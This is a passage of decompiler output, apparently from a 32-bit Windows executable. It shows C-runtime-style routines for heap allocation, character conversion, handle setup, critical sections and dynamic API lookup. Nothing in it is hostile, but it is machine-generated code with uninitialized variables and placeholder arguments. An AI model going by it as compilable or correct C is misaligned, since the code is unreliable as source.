        int32_t v11 = function_40c79f((int32_t)&g266, (int32_t)&g266); // 0x40c080
        int32_t * v12 = (int32_t *)(v2 - 12);
        if (v11 != 0) {
            // 0x40c08c
            *v12 = (int32_t)&g206;
            *(int32_t *)(v2 - 16) = v9;
            function_40be25((int32_t)&g266);
            *(int32_t *)(v2 - 20) = 0;
            function_40c15c((int32_t)&g266);
            v3 = v7;
            result = v9;
            goto lab_0x40c0ad;
        } else {
            // 0x40c089
            *v12 = v9;
            v10 = v12;
            goto lab_0x40c0a4;
        }
    } else {
        // 0x40c070
        *v6 = 0;
        v10 = v6;
        goto lab_0x40c0a4;
    }
  lab_0x40c0ad:
    // 0x40c0ad
    *(int32_t *)(v3 - 4) = errorCode;
    SetLastError((int32_t)&g266);
    // 0x40c0b6
    return result;
  lab_0x40c0a4:
    // 0x40c0a4
    function_40c15c((int32_t)&g266);
    *v10 = errorCode;
    SetLastError((int32_t)&g266);
    // 0x40c0b6
    return 0;
}

// Address range: 0x40c0bc - 0x40c0e8
int32_t function_40c0bc(void) {
    int32_t v1 = function_40c69d(0x40be9e); // 0x40c0c1
    g121 = v1;
    if (v1 == -1) {
        // 0x40c0d0
        return v1 & -256;
    }
    int32_t v2 = function_40c037(); // 0x40c0d3
    if (v2 != 0) {
        // 0x40c0e5
        return v2 & -256 | 1;
    }
    // 0x40c0d0
    return function_40c0e8(v2) & -256;
}

// Address range: 0x40c0e8 - 0x40c102
int32_t function_40c0e8(int32_t a1) {
    int32_t result = -255; // 0x40c0f0
    if (g121 != -1) {
        int32_t v1 = function_40c6f3(g121); // 0x40c0f3
        g121 = -1;
        result = v1 & -256 | 1;
    }
    // 0x40c0ff
    return result;
}

// Address range: 0x40c102 - 0x40c12f
int32_t function_40c102(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)a2; // 0x40c10b
    int32_t result = *v1; // 0x40c10b
    if (result == g206) {
        // 0x40c12c
        return result;
    }
    int32_t v2 = g139; // 0x40c118
    int32_t result2 = v2; // 0x40c123
    if ((*(int32_t *)(a1 + 848) & v2) == 0) {
        // 0x40c125
        int32_t v3; // 0x40c102
        int32_t v4; // 0x40c102
        result2 = function_40e644(v3, v4);
        *v1 = result2;
    }
    // 0x40c12c
    return result2;
}

// Address range: 0x40c12f - 0x40c15c
int32_t function_40c12f(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)a2; // 0x40c138
    int32_t result = *v1; // 0x40c138
    if (result == (int32_t)g133) {
        // 0x40c159
        return result;
    }
    int32_t v2 = g139; // 0x40c145
    int32_t result2 = v2; // 0x40c150
    if ((*(int32_t *)(a1 + 848) & v2) == 0) {
        // 0x40c152
        int32_t v3; // 0x40c12f
        result2 = function_40d424(v3);
        *v1 = result2;
    }
    // 0x40c159
    return result2;
}

// Address range: 0x40c15c - 0x40c196
int32_t function_40c15c(int32_t lpMem) {
    if (lpMem == 0) {
        // 0x40c194
        int32_t result; // 0x40c15c
        return result;
    }
    bool v1 = HeapFree((int32_t *)g227, 0, (int32_t *)lpMem); // 0x40c172
    int32_t result2 = v1; // 0x40c17a
    if (!v1) {
        int32_t v2 = function_40b091(); // 0x40c17d
        result2 = function_40b018(GetLastError());
        *(int32_t *)v2 = result2;
    }
    // 0x40c194
    return result2;
}

// Address range: 0x40c196 - 0x40c1e4
int32_t function_40c196(uint32_t a1) {
    if (a1 >= 0xffffffe1) {
        // 0x40c1d4
        *(int32_t *)function_40b091() = 12;
        // 0x40c1e1
        return 0;
    }
    int32_t v1 = (int32_t)(bool)(a1 == 0) + a1;
    int32_t v2; // bp-8, 0x40c196
    int32_t v3 = &v2;
    *(int32_t *)(v3 - 4) = v1;
    *(int32_t *)(v3 - 8) = 0;
    int32_t v4 = v3 - 12; // 0x40c1c2
    *(int32_t *)v4 = g227;
    int32_t * v5 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x40c1c8
    while (v5 == NULL) {
        // 0x40c1ab
        if (function_40add6() == 0) {
            // 0x40c1d4
            *(int32_t *)function_40b091() = 12;
            // 0x40c1e1
            return 0;
        }
        // 0x40c1b4
        *(int32_t *)(v3 - 16) = v1;
        if (function_409c72((int32_t)&g266) == 0) {
            // 0x40c1d4
            *(int32_t *)function_40b091() = 12;
            // 0x40c1e1
            return 0;
        }
        v3 = v4;
        *(int32_t *)(v3 - 4) = v1;
        *(int32_t *)(v3 - 8) = 0;
        v4 = v3 - 12;
        *(int32_t *)v4 = g227;
        v5 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x40c1e1
    return (int32_t)v5;
}

// Address range: 0x40c1e4 - 0x40c2de
int32_t function_40c1e4(int32_t lpWideCharStr, int32_t a2, uint32_t a3, int32_t a4, int32_t a5) {
    // 0x40c1e4
    if (a2 == 0 || a3 == 0) {
        // 0x40c20f
        return 0;
    }
    char * lpMultiByteStr = (char *)a2; // 0x40c1fc
    if (*lpMultiByteStr == 0) {
        // 0x40c201
        if (lpWideCharStr != 0) {
            // 0x40c208
            *(int16_t *)lpWideCharStr = 0;
        }
        // 0x40c20f
        return 0;
    }
    // 0x40c215
    int32_t v1; // 0x40c1e4
    function_409954(a4, v1);
    int32_t v2; // 0x40c1e4
    int32_t v3; // 0x40c1e4
    int32_t result; // 0x40c1e4
    int32_t v4; // bp-16, 0x40c1e4
    int32_t v5; // 0x40c1e4
    if (*(int32_t *)(v5 + 168) != 0) {
        // 0x40c242
        if (function_40ee92((int32_t)*lpMultiByteStr, &v4) == 0) {
            int32_t CodePage = *(int32_t *)(v4 + 8); // 0x40c2ab
            result = 1;
            if (MultiByteToWideChar(CodePage, 9, lpMultiByteStr, 1, (int16_t *)lpWideCharStr, (int32_t)(lpWideCharStr != 0)) != 0) {
                goto lab_0x40c2c6;
            } else {
                goto lab_0x40c2b8;
            }
        } else {
            int32_t cbMultiByte = *(int32_t *)(v4 + 4); // 0x40c258
            v2 = cbMultiByte;
            if (cbMultiByte < 2 || cbMultiByte > a3) {
                goto lab_0x40c288;
            } else {
                int32_t CodePage2 = *(int32_t *)(v4 + 8); // 0x40c275
                v3 = v4;
                if (MultiByteToWideChar(CodePage2, 9, lpMultiByteStr, cbMultiByte, (int16_t *)lpWideCharStr, (int32_t)(lpWideCharStr != 0)) != 0) {
                    goto lab_0x40c290;
                } else {
                    // 0x40c263
                    v2 = *(int32_t *)(v4 + 4);
                    goto lab_0x40c288;
                }
            }
        }
    } else {
        // 0x40c22d
        result = 1;
        if (lpWideCharStr != 0) {
            // 0x40c234
            *(int16_t *)lpWideCharStr = (int16_t)*lpMultiByteStr;
            result = 1;
        }
        goto lab_0x40c2c6;
    }
  lab_0x40c2c6:;
    // 0x40c2c6
    char v6; // 0x40c1e4
    if (v6 != 0) {
        // 0x40c2cc
        int32_t v7; // 0x40c1e4
        int32_t * v8 = (int32_t *)(v7 + 848); // 0x40c2cf
        *v8 = *v8 & -3;
    }
    // 0x40c20f
    return result;
  lab_0x40c2b8:
    // 0x40c2b8
    *(int32_t *)function_40b091() = 42;
    result = -1;
    goto lab_0x40c2c6;
  lab_0x40c288:
    // 0x40c288
    if (v2 > a3) {
        goto lab_0x40c2b8;
    } else {
        // 0x40c28a
        v3 = v4;
        if (*(char *)(a2 + 1) == 0) {
            goto lab_0x40c2b8;
        } else {
            goto lab_0x40c290;
        }
    }
  lab_0x40c290:
    // 0x40c290
    result = *(int32_t *)(v3 + 4);
    goto lab_0x40c2c6;
}

// Address range: 0x40c2de - 0x40c2f8
int32_t function_40c2de(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40c2de
    int32_t v1; // 0x40c2de
    return function_40c1e4(a1, a2, a3, 0, v1);
}

// Address range: 0x40c2f8 - 0x40c2f9
int32_t function_40c2f8(void) {
    // 0x40c2f8
    int32_t result; // 0x40c2f8
    return result;
}

// Address range: 0x40c2fa - 0x40c3ae
int32_t function_40c2fa(void) {
    // 0x40c2fa
    int32_t lpStartupInfo; // bp-76, 0x40c2fa
    GetStartupInfoW((struct _STARTUPINFOW *)&lpStartupInfo);
    int16_t v1; // 0x40c2fa
    if (v1 == 0) {
        // 0x40c3aa
        return &g266;
    }
    // 0x40c315
    int32_t v2; // 0x40c2fa
    if (v2 == 0) {
        // 0x40c3aa
        return 0;
    }
    int32_t v3 = *(int32_t *)v2; // 0x40c322
    int32_t v4 = v3 < 0x2000 ? v3 : 0x2000;
    function_40dddd(v4);
    int32_t result = g209; // 0x40c33e
    int32_t v5 = v4 > result ? result : v4;
    if (v5 == 0) {
        // 0x40c3aa
        return result;
    }
    int32_t v6 = v2 + 4; // 0x40c324
    int32_t v7 = v3 + v6; // 0x40c351
    int32_t v8 = v6; // 0x40c351
    int32_t v9; // bp-92, 0x40c2fa
    int32_t v10 = &v9; // 0x40c351
    int32_t v11 = 0; // 0x40c351
    int32_t v12; // 0x40c2fa
    int32_t v13; // 0x40c2fa
    int32_t v14; // 0x40c2fa
    int32_t v15; // 0x40c2fa
    char * v16; // 0x40c360
    while (true) {
      lab_0x40c354:
        // 0x40c354
        v14 = v11;
        int32_t v17 = v10;
        v13 = v8;
        int32_t * v18 = (int32_t *)v7; // 0x40c354
        uint32_t v19 = *v18; // 0x40c354
        v10 = v17;
        if (v19 > 0xfffffffd) {
            goto lab_0x40c39b;
        } else {
            // 0x40c360
            v16 = (char *)v13;
            char v20 = *v16; // 0x40c360
            v10 = v17;
            if ((v20 & 1) == 0) {
                goto lab_0x40c39b;
            } else {
                // 0x40c367
                v12 = v19;
                v15 = v17;
                if ((v20 & 8) != 0) {
                    goto lab_0x40c377;
                } else {
                    int32_t v21 = v17 - 4; // 0x40c36c
                    *(int32_t *)v21 = v19;
                    int32_t v22 = GetFileType(&g266); // 0x40c36d
                    v10 = v21;
                    if (v22 == 0) {
                        goto lab_0x40c39b;
                    } else {
                        // 0x40c36c
                        v12 = *v18;
                        v15 = v21;
                        goto lab_0x40c377;
                    }
                }
            }
        }
    }
  lab_0x40c3aa:;
    // 0x40c3aa
    int32_t result2; // 0x40c2fa
    return result2;
  lab_0x40c39b:
    // 0x40c39b
    v11 = v14 + 1;
    v7 += 4;
    v8 = v13 + 1;
    result2 = v7;
    if (v11 == v5) {
        // break -> 0x40c3aa
        goto lab_0x40c3aa;
    }
    goto lab_0x40c354;
  lab_0x40c377:;
    int32_t v23 = *(int32_t *)(4 * v14 / 64 + (int32_t)&g207); // 0x40c387
    int32_t v24 = v23 + 48 * (v14 & 63); // 0x40c387
    *(int32_t *)(v24 + 24) = v12;
    *(char *)(v24 + 40) = *v16;
    v10 = v15;
    goto lab_0x40c39b;
}

// Address range: 0x40c3ae - 0x40c3af
int32_t function_40c3ae(void) {
    // 0x40c3ae
    int32_t result; // 0x40c3ae
    return result;
}

// Address range: 0x40c3b0 - 0x40c464
int32_t function_40c3b0(void) {
    // 0x40c3b0
    int32_t v1; // bp-12, 0x40c3b0
    int32_t v2 = &v1; // 0x40c3b3
    int32_t v3 = 0; // 0x40c3b3
    int32_t result; // 0x40c3b0
    int32_t v4; // 0x40c3b0
    int32_t v5; // 0x40c3b0
    int32_t * v6; // 0x40c3c9
    char * v7; // 0x40c3b0
    while (true) {
      lab_0x40c3b5:
        // 0x40c3b5
        v4 = v3;
        int32_t v8 = v2;
        int32_t v9 = *(int32_t *)(4 * v4 / 64 + (int32_t)&g207); // 0x40c3c2
        int32_t v10 = 48 * v4 + v9; // 0x40c3c2
        v6 = (int32_t *)(v10 + 24);
        v7 = (char *)(v10 + 40);
        if (*v6 > 0xfffffffd) {
            // 0x40c3db
            *v7 = -127;
            int32_t v11; // 0x40c3b0
            if (v4 == 0) {
                int32_t v12 = v8 - 4; // 0x40c3f6
                *(int32_t *)v12 = -10;
                v11 = v12;
            } else {
                int32_t v13 = v8 - 4;
                int32_t * v14 = (int32_t *)v13;
                if (v4 == 1) {
                    // 0x40c3f2
                    *v14 = -11;
                    v11 = v13;
                } else {
                    // 0x40c3eb
                    *v14 = -12;
                    v11 = v13;
                }
            }
            int32_t v15 = v11;
            int32_t v16 = (int32_t)GetStdHandle((int32_t)&g266); // 0x40c3fa
            v5 = v15;
            switch (v16) {
                case -1: {
                    goto lab_0x40c438;
                }
                case 0: {
                    goto lab_0x40c438;
                }
                default: {
                    int32_t v17 = v15 - 4; // 0x40c40b
                    *(int32_t *)v17 = v16;
                    int32_t v18 = GetFileType(&g266); // 0x40c40c
                    if (v18 == 0) {
                        goto lab_0x40c438;
                    } else {
                        int32_t v19 = v18 & 255; // 0x40c41a
                        *v6 = v16;
                        if (v19 != 2) {
                            // 0x40c42d
                            result = v19;
                            v2 = v17;
                            if (v19 == 3) {
                                // 0x40c432
                                *v7 = *v7 | 8;
                                result = v19;
                                v2 = v17;
                            }
                        } else {
                            // 0x40c427
                            *v7 = *v7 | 64;
                            result = v19;
                            v2 = v17;
                        }
                        goto lab_0x40c456;
                    }
                }
            }
        } else {
            // 0x40c3d5
            *v7 = *v7 | -128;
            result = v4;
            v2 = v8;
            goto lab_0x40c456;
        }
    }
  lab_0x40c460:
    // 0x40c460
    return result;
  lab_0x40c438:;
    int32_t v20 = v5;
    *v7 = *v7 | 64;
    *v6 = -2;
    result = 0;
    v2 = v20;
    if (g203 != 0) {
        int32_t v21 = *(int32_t *)(g203 + 4 * v4); // 0x40c44c
        *(int32_t *)(v21 + 16) = -2;
        result = v21;
        v2 = v20;
    }
    goto lab_0x40c456;
  lab_0x40c456:
    // 0x40c456
    v3 = v4 + 1;
    if (v3 == 3) {
        // break -> 0x40c460
        goto lab_0x40c460;
    }
    goto lab_0x40c3b5;
}

// Address range: 0x40c464 - 0x40c4ae
int32_t function_40c464(void) {
    // 0x40c464
    function_406cf0(&g99, 12, (int32_t)&g266);
    function_40c527(7);
    int32_t v1; // 0x40c464
    char * v2 = (char *)(v1 - 25); // 0x40c47a
    *v2 = 0;
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40c47d
    *v3 = 0;
    if (function_40dddd(0) == 0) {
        // 0x40c48b
        function_40c2f8();
        function_40c3ae();
        *v2 = 1;
    }
    // 0x40c49a
    *v3 = -2;
    function_40c4b1();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40c4a8
    return result;
}

// Address range: 0x40c4b1 - 0x40c4ba
int32_t function_40c4b1(void) {
    // 0x40c4b1
    return function_40c56f(7);
}

// Address range: 0x40c4bc - 0x40c4e6
int32_t function_40c4bc(void) {
    int32_t result; // 0x40c4bc
    for (int32_t i = 0; i < 512; i += 4) {
        int32_t * v1 = (int32_t *)(i + (int32_t)&g207); // 0x40c4bf
        int32_t v2 = *v1; // 0x40c4bf
        result = 1;
        if (v2 != 0) {
            // 0x40c4c9
            int32_t v3; // bp-4, 0x40c4bc
            *(int32_t *)((int32_t)&v3 - 4) = v2;
            int32_t v4 = function_40dda8((int32_t)&g266); // 0x40c4ca
            *v1 = 0;
            result = v4 & -256 | 1;
        }
    }
    // 0x40c4e2
    return result;
}

// Address range: 0x40c4e8 - 0x40c527
int32_t function_40c4e8(void) {
    int32_t v1 = 0; // 0x40c4ef
    int32_t v2 = (int32_t)&g210; // 0x40c4ef
    int32_t v3; // bp-8, 0x40c4e8
    int32_t v4 = &v3;
    *(int32_t *)(v4 - 4) = 0;
    *(int32_t *)(v4 - 8) = 4000;
    int32_t v5 = v4 - 12; // 0x40c4f8
    *(int32_t *)v5 = v2;
    int32_t v6 = function_40c7f8((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40c4f9
    int32_t result; // 0x40c4e8
    while (v6 != 0) {
        // 0x40c502
        g211 = (int32_t)g211 + 1;
        v1 += 24;
        v2 += 24;
        if (v1 >= 312) {
            // 0x40c516
            result = v6 & -256 | 1;
            return result;
        }
        v4 = v5;
        *(int32_t *)(v4 - 4) = 0;
        *(int32_t *)(v4 - 8) = 4000;
        v5 = v4 - 12;
        *(int32_t *)v5 = v2;
        v6 = function_40c7f8((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x40c51a
    *(int32_t *)(v4 - 16) = 0;
    result = function_40c53e() & -256;
  lab_0x40c524:
    // 0x40c524
    return result;
}

// Address range: 0x40c527 - 0x40c53e
int32_t function_40c527(int32_t a1) {
    // 0x40c527
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)(24 * a1 + (int32_t)&g210));
    return &g266;
}

// Address range: 0x40c53e - 0x40c56f
int32_t function_40c53e(void) {
    int32_t v1 = g211; // 0x40c541
    if (v1 == 0) {
        // 0x40c56b
        int32_t v2; // 0x40c53e
        return v2 & -256 | 1;
    }
    // 0x40c54b
    int32_t v3; // bp-8, 0x40c53e
    int32_t v4 = &v3; // 0x40c54f
    int32_t v5 = v1; // 0x40c54f
    int32_t v6 = 24 * v1 + (int32_t)&g208; // 0x40c54f
    v4 -= 4;
    *(int32_t *)v4 = v6;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    g211 = (int32_t)g211 - 1;
    v5--;
    v6 -= 24;
    while (v5 != 0) {
        // 0x40c555
        v4 -= 4;
        *(int32_t *)v4 = v6;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
        g211 = (int32_t)g211 - 1;
        v5--;
        v6 -= 24;
    }
    // 0x40c56b
    return (int32_t)&g266 & -256 | 1;
}

// Address range: 0x40c56f - 0x40c586
int32_t function_40c56f(int32_t a1) {
    // 0x40c56f
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(24 * a1 + (int32_t)&g210));
    return &g266;
}

// Address range: 0x40c586 - 0x40c622
int32_t function_40c586(int32_t a1, char * a2, int32_t * a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t * v1 = (int32_t *)(4 * a1 + (int32_t)&g213); // 0x40c598
    uint32_t v2 = g112 & 31; // 0x40c5a7
    int32_t v3 = g112 ^ *v1; // 0x40c5aa
    int32_t result2 = v3; // 0x40c5ac
    if (v2 != 0) {
        result2 = v3 << 32 - v2 | v3 >> v2;
    }
    int32_t v4; // 0x40c586
    int32_t v5; // 0x40c586
    switch (result2) {
        case -1: {
            // 0x40c61d
            return 0;
        }
        case 0: {
            // 0x40c5ba
            int32_t v6; // bp-16, 0x40c586
            int32_t v7 = &v6; // 0x40c590
            v4 = g112;
            v5 = v7;
            if (a3 != a4) {
                int32_t * v8 = (int32_t *)(v7 - 4);
                int32_t v9 = (int32_t)a3; // 0x40c5ce
                *v8 = *(int32_t *)v9;
                int32_t v10 = function_40c622((int32_t)&g266); // 0x40c5c4
                while (v10 == 0) {
                    // 0x40c5ce
                    v9 += 4;
                    if (v9 == (int32_t)a4) {
                        // 0x40c5d6
                        v4 = g112;
                        v5 = v7;
                        goto lab_0x40c60b;
                    }
                    *v8 = *(int32_t *)v9;
                    v10 = function_40c622((int32_t)&g266);
                }
                // 0x40c5e2
                *v8 = (int32_t)a2;
                int32_t v11 = v7 - 8; // 0x40c5e5
                *(int32_t *)v11 = v10;
                int32_t (*func)() = GetProcAddress(&g266, (char *)&g266); // 0x40c5e6
                if (func != NULL) {
                    int32_t result = (int32_t)func; // 0x40c5e6
                    *(int32_t *)(v7 - 12) = result;
                    *v1 = function_406100((int32_t)&g266);
                    // 0x40c61d
                    return result;
                }
                // 0x40c605
                v4 = g112;
                v5 = v11;
            }
            // break -> 0x40c60b
            break;
        }
        default: {
            // 0x40c61d
            return result2;
        }
    }
    goto lab_0x40c60b;
  lab_0x40c60b:
    // 0x40c60b
    *(int32_t *)(v5 - 4) = 32;
    uint32_t v12 = -v4 & 31; // 0x40c615
    int32_t v13 = -1; // 0x40c615
    if (v12 != 0) {
        v13 = -1 << 32 - v12 | 0xffffffff >> v12;
    }
    *v1 = v13 ^ v4;
    // 0x40c61d
    return 0;
}

// Address range: 0x40c622 - 0x40c69d
int32_t function_40c622(int32_t a1) {
    int32_t v1 = 4 * a1; // 0x40c62b
    int32_t * v2 = (int32_t *)(v1 + (int32_t)&g212); // 0x40c632
    int32_t v3 = *v2; // 0x40c632
    if (v3 != 0) {
        // 0x40c69a
        return v3 == -1 ? 0 : v3;
    }
    int16_t * lpLibFileName = (int16_t *)*(int32_t *)(v1 + (int32_t)&g37); // 0x40c653
    int16_t * v4 = lpLibFileName; // bp-28, 0x40c653
    int32_t * hFile = LoadLibraryExW(lpLibFileName, NULL, 2048); // 0x40c654
    int32_t dwFlags = (int32_t)hFile; // 0x40c654
    int16_t ** v5 = &v4; // 0x40c65e
    int32_t result = dwFlags; // 0x40c65e
    if (hFile == NULL) {
        // 0x40c660
        if (GetLastError() != 87) {
            // 0x40c67e
            *v2 = -1;
            // 0x40c69a
            return 0;
        }
        int16_t * v6 = lpLibFileName; // bp-40, 0x40c66d
        int32_t * v7 = LoadLibraryExW(lpLibFileName, hFile, dwFlags); // 0x40c66e
        v5 = &v6;
        result = (int32_t)v7;
        if (v7 == NULL) {
            // 0x40c67e
            *v2 = -1;
            // 0x40c69a
            return 0;
        }
    }
    // 0x40c687
    *v2 = result;
    if (*v2 != 0) {
        // 0x40c68f
        *(int32_t *)((int32_t)v5 - 4) = result;
        FreeLibrary(&g266);
    }
    // 0x40c69a
    return result;
}

// Address range: 0x40c69d - 0x40c6f3
int32_t function_40c69d(int32_t a1) {
    // 0x40c69d
    int32_t v1; // bp-4, 0x40c69d
    int32_t v2; // 0x40c69d
    int32_t v3; // 0x40c69d
    int32_t v4 = function_40c586(3, "FlsAlloc", &g38, &g39, v2, g112 ^ (int32_t)&v1, v3); // 0x40c6bf
    if (v4 == 0) {
        // 0x40c6dc
        TlsAlloc();
    } else {
        // 0x40c6cd
        function_406b3d();
    }
    // 0x40c6e2
    return function_406b2c();
}

// Address range: 0x40c6f3 - 0x40c749
int32_t function_40c6f3(int32_t dwTlsIndex) {
    // 0x40c6f3
    int32_t v1; // bp-4, 0x40c6f3
    int32_t v2; // 0x40c6f3
    int32_t v3; // 0x40c6f3
    int32_t v4 = function_40c586(4, "FlsFree", &g39, &g40, v2, g112 ^ (int32_t)&v1, v3); // 0x40c715
    if (v4 == 0) {
        // 0x40c732
        TlsFree(dwTlsIndex);
    } else {
        // 0x40c726
        function_406b3d();
    }
    // 0x40c738
    return function_406b2c();
}

// Address range: 0x40c749 - 0x40c79f
int32_t function_40c749(int32_t dwTlsIndex) {
    // 0x40c749
    int32_t v1; // bp-4, 0x40c749
    int32_t v2; // 0x40c749
    int32_t v3; // 0x40c749
    int32_t v4 = function_40c586(5, "FlsGetValue", &g40, &g41, v2, g112 ^ (int32_t)&v1, v3); // 0x40c76b
    if (v4 == 0) {
        // 0x40c788
        TlsGetValue(dwTlsIndex);
    } else {
        // 0x40c77c
        function_406b3d();
    }
    // 0x40c78e
    return function_406b2c();
}

// Address range: 0x40c79f - 0x40c7f8
int32_t function_40c79f(int32_t dwTlsIndex, int32_t lpTlsValue) {
    // 0x40c79f
    int32_t v1; // bp-4, 0x40c79f
    int32_t v2; // 0x40c79f
    int32_t v3; // 0x40c79f
    int32_t v4 = function_40c586(6, "FlsSetValue", &g41, &g42, v2, g112 ^ (int32_t)&v1, v3); // 0x40c7c1
    if (v4 == 0) {
        // 0x40c7e1
        TlsSetValue(dwTlsIndex, (int32_t *)lpTlsValue);
    } else {
        // 0x40c7d5
        function_406b3d();
    }
    // 0x40c7e7
    return function_406b2c();
}

// Address range: 0x40c7f8 - 0x40c85a
int32_t function_40c7f8(int32_t lpCriticalSection, int32_t dwSpinCount, int32_t a3) {
    // 0x40c7f8
    int32_t v1; // bp-4, 0x40c7f8
    int32_t v2; // 0x40c7f8
    int32_t v3; // 0x40c7f8
    int32_t v4 = function_40c586(20, "InitializeCriticalSectionEx", (int32_t *)&g43, &g44, v2, g112 ^ (int32_t)&v1, v3); // 0x40c81a
    if (v4 == 0) {
        // 0x40c83d
        InitializeCriticalSectionAndSpinCount((struct _RTL_CRITICAL_SECTION *)lpCriticalSection, dwSpinCount);
    } else {
        // 0x40c828
        function_406b3d();
    }
    // 0x40c849
    return function_406b2c();
}

// Address range: 0x40c85a - 0x40c8e2
int32_t function_40c85a(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x40c85a
    int32_t v1; // bp-4, 0x40c85a
    int32_t v2; // 0x40c85a
    int32_t v3; // 0x40c85a
    int32_t v4 = function_40c586(22, "LCMapStringEx", &g44, (int32_t *)"LCMapStringEx", v2, g112 ^ (int32_t)&v1, v3); // 0x40c87c
    if (v4 == 0) {
        int32_t Locale = function_40c8e2(a1, 0, a2, a3, a4, a5, a6); // 0x40c8c5
        LCMapStringW(Locale, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266);
    } else {
        // 0x40c88a
        function_406b3d();
    }
    // 0x40c8d1
    return function_406b2c();
}

// Address range: 0x40c8e2 - 0x40c93e
int32_t function_40c8e2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    // 0x40c8e2
    int32_t v1; // bp-4, 0x40c8e2
    int32_t v2; // 0x40c8e2
    int32_t v3; // 0x40c8e2
    int32_t v4 = function_40c586(24, "LocaleNameToLCID", &g45, (int32_t *)"LocaleNameToLCID", v2, g112 ^ (int32_t)&v1, v3); // 0x40c904
    if (v4 == 0) {
        // 0x40c924
        function_40f1ef(a1);
    } else {
        // 0x40c912
        function_406b3d();
    }
    // 0x40c92d
    return function_406b2c();
}

// Address range: 0x40c93e - 0x40c964
int32_t function_40c93e(void) {
    // 0x40c93e
    __asm_rep_stosd_memset((char *)&g213, g112, 32);
    return g112 & -256 | 1;
}

// Address range: 0x40c964 - 0x40c9eb
int32_t function_40c964(int32_t a1) {
    // 0x40c964
    if (g214 != 0) {
        // 0x40c9dd
        return function_406b2c();
    }
    int32_t v1 = &g42; // bp-24, 0x40c98f
    int32_t v2; // bp-4, 0x40c964
    int32_t v3; // 0x40c964
    int32_t v4; // 0x40c964
    int32_t v5 = function_40c586(8, "GetCurrentPackageId", &g42, (int32_t *)"GetCurrentPackageId", v3, v4, g112 ^ (int32_t)&v2); // 0x40c99b
    int32_t v6; // bp-16, 0x40c964
    int32_t * v7 = &v6; // 0x40c9a7
    if (v5 != 0) {
        int32_t v8 = 0; // bp-12, 0x40c9a9
        v1 = &v8;
        int32_t v9 = function_406b3d(); // 0x40c9b5
        v7 = &v1;
        if (v9 == 122) {
            // 0x40c9dc
            g214 = 1;
            // 0x40c9dd
            return function_406b2c();
        }
    }
    // 0x40c9d0
    *(int32_t *)((int32_t)v7 - 4) = 2;
    // 0x40c9dc
    g214 = 2;
    // 0x40c9dd
    return function_406b2c();
}

// Address range: 0x40c9ed - 0x40ca21
int32_t function_40c9ed(char a1) {
    int32_t v1; // 0x40c9ed
    if (a1 != 0) {
        // 0x40ca1d
        return v1 & -256 | 1;
    }
    // 0x40c9f6
    int32_t v2; // bp-8, 0x40c9ed
    int32_t v3 = &v2; // 0x40c9f7
    int32_t v4 = &g212; // 0x40c9f7
    int32_t v5; // 0x40c9ed
    int32_t v6; // 0x40c9ed
    int32_t v7; // 0x40c9ed
    int32_t * v8; // 0x40c9fc
    int32_t v9; // 0x40ca06
    while (true) {
      lab_0x40c9fc:;
        int32_t v10 = v3;
        v8 = (int32_t *)v4;
        int32_t v11 = *v8; // 0x40c9fc
        v9 = v10;
        v6 = v5;
        v3 = v10;
        v7 = v5;
        switch (v11) {
            case 0: {
                goto lab_0x40ca11;
            }
            case -1: {
                goto lab_0x40ca0e;
            }
            default: {
                // 0x40ca06
                v9 = v10 - 4;
                *(int32_t *)v9 = v11;
                v6 = FreeLibrary(&g266);
                goto lab_0x40ca0e;
            }
        }
    }
    // 0x40ca1d
    return v1 & -256 | 1;
  lab_0x40ca11:
    // 0x40ca11
    v4 += 4;
    v5 = v7;
    v1 = v7;
    if (v4 == (int32_t)&g213) {
        return v1 & -256 | 1;
    }
    goto lab_0x40c9fc;
  lab_0x40ca0e:
    // 0x40ca0e
    *v8 = 0;
    v3 = v9;
    v7 = v6;
    goto lab_0x40ca11;
}

// Address range: 0x40ca21 - 0x40ca7e
int32_t function_40ca21(uint32_t a1, uint32_t a2) {
    if (a1 != 0) {
        if (0xffffffe0 / a1 < a2) {
          lab_0x40ca6e_2:
            // 0x40ca6e
            *(int32_t *)function_40b091() = 12;
            // 0x40ca7b
            return 0;
        }
    }
    int32_t v1 = a2 * a1; // 0x40ca3a
    int32_t v2 = v1 + (int32_t)(v1 == 0);
    int32_t v3; // bp-8, 0x40ca21
    int32_t v4 = &v3;
    *(int32_t *)(v4 - 4) = v2;
    *(int32_t *)(v4 - 8) = 8;
    int32_t v5 = v4 - 12; // 0x40ca5c
    *(int32_t *)v5 = g227;
    int32_t * v6 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x40ca62
    while (v6 == NULL) {
        // 0x40ca45
        if (function_40add6() == 0) {
            goto lab_0x40ca6e_2;
        }
        // 0x40ca4e
        *(int32_t *)(v4 - 16) = v2;
        if (function_409c72((int32_t)&g266) == 0) {
            goto lab_0x40ca6e_2;
        }
        v4 = v5;
        *(int32_t *)(v4 - 4) = v2;
        *(int32_t *)(v4 - 8) = 8;
        v5 = v4 - 12;
        *(int32_t *)v5 = g227;
        v6 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x40ca7b
    return (int32_t)v6;
}

// Address range: 0x40ca80 - 0x40ca96
int32_t function_40ca80(uint32_t a1, uint32_t a2) {
    if (a2 > a1) {
        // 0x40ca8b
        return -1;
    }
    // 0x40ca90
    return (bool)(a2 < a1);
}

// Address range: 0x40ca96 - 0x40cc26
